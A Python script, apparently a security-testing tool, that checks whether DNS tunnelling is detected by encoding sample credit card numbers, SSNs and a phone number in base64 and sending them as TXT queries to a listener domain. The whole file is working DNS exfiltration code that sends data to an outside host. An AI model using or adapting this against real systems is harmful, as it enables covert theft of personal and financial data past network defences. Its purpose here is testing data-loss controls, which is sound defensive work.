#LeakyFaucet v1.02.0
#Written: Mr.Waterhouse
#April 26, 2023
#
#This DNS tunnelling script created as part of a fun little side project. It is designed to quickly test if DNS tunnelling is possible
#in the environment. Simply put, is your existing security stack doing what it is supposed to do?
#
#Usage: python3 leakyfaucet_1.02.0.py [phoneNumber] [domain]
#ie. python3 leakyfaucet_1.02.0.py 15555555555 sampledomain.xyz
#
#The phone number MUST have a leading 1 for country code. Eventually I'll get around to coding a check and adding in the country code if
#it is missing but for now it will not work without it. More specifically, this script will still encode and send, but the server will not
#accept it in the wrong format. So if all you want to do is generate dns tunnel traffic, you can put in whatever you want as the phoneNumber
#argument at the cli.
#
#Prerequisites: This is a pyhone script so.....python. You will also need dnspython which can be installed via: pip3 install dnspython.
#I've only tested this script in Mac OS X and Kali. 
#
#Acknowledgements: I code like a 5th grader, so any time I got stuck I would search in reddit for ideas. As a last resort, I'd hit up
#ChatGPT and it would usually set me on a better path. The sample CC and PII data is also sources from www.dlptest.com.

#Import Requirements
import time
import random
import socket
import base64
import dns.resolver
import sys

# Generate a random 5-digit number to act as session id. This is required by the listener in order to differentiate traffic from multiple
#users.
ranNum = random.randint(10000, 99999)

#Assign Variables - You can adjust all of these. DO NOT put real credit cards and PII in here. That is idiotic! If you do, you will actually
#be leaking sensitive data. Any traffic received by my server is wiped every two hours. No exceptions!
phone_arg = sys.argv[1]  
phone_number = str(ranNum) + str(phone_arg)

cli_domain = sys.argv[2]              #You can rem this line out if you are going to hard code the listener domain below.
listener_domain = str(cli_domain)     #You can aslo rem out the line above and hard code your listener domain here if it never changes.
credit_card_1 = str(ranNum) + '4916-4034-9269-8783 1/18/2024'
credit_card_2 = str(ranNum) + '5548-0246-6336-5664 5/16/2026'
ssn_1 = str(ranNum) + 'Rick Edwards 612-20-6832'
ssn_2 = str(ranNum) + 'Mark Hall 449-48-3135'

#Encode and display DNS host variable in base64
b64_phone = base64.b64encode(phone_number.encode('utf-8')).decode('utf-8')
b64_cc1 = base64.b64encode(credit_card_1.encode('utf-8')).decode('utf-8')
b64_cc2 = base64.b64encode(credit_card_2.encode('utf-8')).decode('utf-8')
b64_ssn1 = base64.b64encode(ssn_1.encode('utf-8')).decode('utf-8')
b64_ssn2 = base64.b64encode(ssn_2.encode('utf-8')).decode('utf-8')

print('Encoded phone number is:', b64_phone)
print('Encoded CC1 is:', b64_cc1)
print('Encoded CC2 is:', b64_cc2)
print('Encoded SSN1 is:', b64_ssn1)
print('Encoded SSN2 is:', b64_ssn2)

#Create DNS Data Array
dns_data =[b64_phone, b64_cc1, b64_cc2, b64_ssn1, b64_ssn2]

#Loop to run DNS queries over a period of 20 seconds per query.
for value in dns_data:
    dns_query = value + '.' + listener_domain
    print('Performing NSLOOKUP type=TXT for:', dns_query)
    try:
        answers = dns.resolver.resolve(dns_query, 'TXT')
        for rdata in answers:
            for txt_string in rdata.strings:
                print(txt_string.decode('utf-8'))
    except dns.resolver.NXDOMAIN:
        print('The domain you specified does not exist.')       #Domain name does not exist
    except dns.resolver.NoAnswer:
        print('Checking my pockets for data.')         			#No TXT records found
    except dns.exception.Timeout:
        print('I fell asleep waiting for a server reply.')      #DNS query timed out
    except dns.resolver.NoNameservers:
        print('No name server found.')         					#No name servers found
        
    time.sleep(20)                  							#set this timer to a larger value (in seconds) to slow the drip rate
print("Session ID: " + str(ranNum))